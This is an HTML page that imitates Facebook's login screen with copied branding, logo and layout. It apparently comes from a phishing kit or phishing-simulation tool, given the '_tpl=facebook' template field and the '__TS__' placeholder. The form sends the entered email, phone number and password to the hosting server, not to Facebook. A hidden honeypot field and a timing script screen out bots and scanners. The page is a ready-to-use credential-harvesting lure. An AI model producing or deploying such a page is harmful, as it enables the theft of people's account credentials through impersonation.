<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Log in to Facebook</title>
<meta name="theme-color" content="#1877F2">
<meta name="referrer" content="strict-origin-when-cross-origin">
<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%231877F2%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EF%3C/text%3E%3C/svg%3E">
<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%231877F2%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EF%3C/text%3E%3C/svg%3E">
<meta property="og:title" content="Log in to Facebook">
<meta property="og:site_name" content="Facebook">
<style>
  body { margin:0;min-height:100vh;background:#fff;color:#1c1e21;
         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,
                     sans-serif; }
  .bar { background:#1877F2;padding:0 16px;height:60px;display:flex;align-items:center;
         box-shadow:0 1px 2px rgba(0,0,0,.15); }
  .bar .inner { max-width:980px;margin:0 auto;width:100%;display:flex;align-items:center; }
  .wrap { display:flex;justify-content:center;padding:48px 16px; }
  .col { width:100%;max-width:396px; }
  .card { background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),
          0 8px 16px rgba(0,0,0,.1);padding:20px 16px;box-sizing:border-box; }
  h1 { font-size:17px;font-weight:600;text-align:center;margin:0 0 16px;color:#1c1e21; }
  .field { margin-bottom:12px; }
  .field input { width:100%;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;
                 border-radius:6px;outline:none;box-sizing:border-box;background:#fff; }
  .field input:focus { border-color:#1877F2;box-shadow:0 0 0 2px #e7f3ff; }
  .btn { width:100%;padding:12px;font-size:20px;font-weight:700;color:#fff;
         background:#1877F2;border:0;border-radius:6px;cursor:pointer; }
  .btn:hover { background:#166fe5; }
  .forgot { text-align:center;margin:14px 0 0;font-size:14px; }
  .forgot a { color:#1877F2;text-decoration:none; }
  .divider { border-top:1px solid #dadde1;margin:20px 0; }
  .green { display:block;width:fit-content;margin:0 auto;background:#42b72a;color:#fff;
           font-size:17px;font-weight:700;padding:12px 20px;border-radius:6px;
           text-decoration:none; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
</style>
</head>
<body>
<div class="bar"><div class="inner"><svg viewBox="0 0 36 36" width="40" height="40" role="img" aria-label="Facebook"><path fill="#fff" d="M25 23l.8-5h-4.8v-3.2c0-1.4.7-2.8 2.9-2.8h2.2V7.6s-2-.3-3.9-.3c-3.9 0-6.4 2.4-6.4 6.6V18H11v5h4.8v12h5.9V23H25z"/></svg></div></div>
<div class="wrap"><div class="col">
  <form class="card" method="POST" action="/">
    <h1>Log in to Facebook</h1>
    <div class="field">
      <label for="login">Email or phone number</label>
      <input id="login" name="login" type="text" placeholder="Email or phone number" autocomplete="username" required>
    </div>
    <div class="field">
      <label for="password">Password</label>
      <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required>
    </div>
    <button class="btn" type="submit">Log in</button>
    <div class="forgot"><a href="#">Forgotten password?</a></div>

  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
  <input type="hidden" name="_tpl" value="facebook">
  <input type="hidden" name="_ts" value="__TS__">

<script>
/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
   record it, and we log how long the form was open (bot forms are instant). */
(function(){
  var t0 = Date.now();
  var f = document.querySelector('form');
  if(!f) return;
  f.addEventListener('submit', function(){
    var el = f.querySelector('input[name=_ts]');
    if(el) el.value = String(Date.now() - t0);
  });
})();
</script>
    <div class="divider"></div>
    <a class="green" href="#">Create new account</a>
  </form>
</div></div>
</body>
</html>
